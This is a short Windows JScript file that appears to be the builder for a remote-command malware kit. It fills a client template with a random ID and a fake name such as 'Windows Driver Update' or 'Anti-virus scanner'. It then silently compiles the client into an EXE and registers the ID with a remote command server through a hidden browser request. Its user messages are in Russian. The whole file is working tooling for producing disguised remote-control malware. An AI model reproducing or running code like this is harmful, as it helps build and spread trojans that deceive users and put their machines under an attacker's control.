var shell = WScript.CreateObject("WScript.Shell");
var fs = WScript.CreateObject("Scripting.FileSystemObject");
var names = ["Windows Driver Update", "System Files Check", "Anti-virus scanner"];

try{
	WScript.StdOut.Write(" \x08");
}catch(e){
	shell.Run('cscript //nologo "'+WScript.ScriptFullName+'"');
	WScript.Quit();
}

function get(url){
	var ie = WScript.CreateObject("InternetExplorer.Application");
	ie.Navigate(url+((url.indexOf("?")>0)?"&":"?")+"r="+Math.floor(Math.random()+999999));
	while(ie.ReadyState < 4) WScript.Sleep(100);
	var d = ie.Document;
	var text = ""+d.body.innerText;
	ie.Quit();
	return text;
}

var id = Math.floor(Math.random()*9999999999999);
var name = names[Math.floor(Math.random()*names.length)];
var path = WScript.ScriptFullName.replace("createScript.js","client_"+id+".js");

var text = fs.OpenTextFile("client.js", 1).ReadAll();
text = text.replace("##FILE##", id);
text = text.replace("##SCRIPT_NAME##", name);

var file = fs.OpenTextFile("client_"+id+".js", 2, 1);
file.Write(text);
file.Close();

shell.Run('c2exe\\compile.bat "'+path+'"', 0);

get("http://yfiles.22web.org/RemoteCMD/write.php?name="+id+".txt&data=cmd:script_not_runned");

WScript.StdOut.Write("Скрипт успешно создан!\n\nID скрипта: "+id+"\nПуть к скрипту: "+path+"\nПуть к упакованному в EXE скрипту: "+path.replace(".js", ".exe")+"\n\nID скрипта скопирован!\n");
shell.Run('cmd /c "echo '+id+'|clip"', 0);

WScript.StdIn.ReadLine();